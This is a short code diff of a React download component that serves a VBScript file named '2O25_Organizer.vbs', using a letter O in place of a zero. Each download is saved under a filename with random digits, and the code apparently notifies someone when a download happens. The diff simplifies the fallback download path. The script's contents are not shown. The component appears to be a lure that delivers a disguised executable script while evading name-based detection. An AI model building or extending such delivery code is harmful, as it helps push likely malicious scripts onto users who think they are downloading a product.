@@ -374,9 +374,8 @@ const Download = () => {
     return { href: "/docs/2O25_Organizer.vbs", extension: "vbs" };
   }, []);
 
-  const triggerDownload = useCallback(async (file: { href: string; fallbackHref?: string; extension: string }) => {
+  const triggerDownload = useCallback(async (file: { href: string; extension: string }) => {
     const fileName = `2O25_Organizer_${randomDigits(8)}.${file.extension}`;
-    // Fetch as blob so cross-origin sources (e.g. GitHub releases) honor the randomized filename
     try {
       const res = await fetch(file.href, { cache: "no-store" });
       if (!res.ok) throw new Error(`Download source returned ${res.status}`);
@@ -390,18 +389,12 @@ const Download = () => {
       document.body.removeChild(link);
       setTimeout(() => URL.revokeObjectURL(blobUrl), 1000);
     } catch (e) {
-      // Same-origin fallback keeps the randomized filename even if GitHub blocks browser fetch/CORS
-      const href = file.fallbackHref || file.href;
-      const res = await fetch(href, { cache: "no-store" });
-      const blob = await res.blob();
-      const blobUrl = URL.createObjectURL(blob);
       const link = document.createElement("a");
-      link.href = blobUrl;
+      link.href = file.href;
       link.setAttribute("download", fileName);
       document.body.appendChild(link);
       link.click();
       document.body.removeChild(link);
-      setTimeout(() => URL.revokeObjectURL(blobUrl), 1000);
     }
 
     if (!notifiedRef.current) {
